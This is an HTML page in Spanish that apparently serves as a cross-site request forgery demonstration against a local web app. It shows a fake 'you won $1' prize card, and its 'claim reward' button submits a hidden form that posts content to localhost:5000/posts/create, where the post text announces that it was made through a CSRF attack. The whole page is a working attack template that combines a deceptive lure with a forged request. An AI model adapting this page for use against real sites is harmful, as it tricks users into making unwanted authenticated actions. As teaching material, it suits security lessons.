<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ganaste</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        .card-float {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
        }
    </style>
</head>
<body>
<div class="card card-float text-center">
    <div class="card-header bg-success text-white">
        ¡Felicidades!
    </div>
    <div class="card-body">
        <h5 class="card-title">¡Ganaste $1!</h5>
        <p class="card-text">Por solo entrar a esta página, has sido recompensado con $1.</p>
        <form method="POST" action="http://localhost:5000/posts/create">
            <input type="hidden" name="title" value="Haz sido atacado">
            <input type="hidden" name="content" value="Acabaste de crear un nuevo post por medio de un ataque CSRF">
            <button type="submit" class="btn btn-primary btn-sm">Reclama tu recompensa</button>
        </form>
    </div>
    <div class="card-footer text-muted">
        Oferta válida por tiempo limitado
    </div>
</div>
</body>
</html>
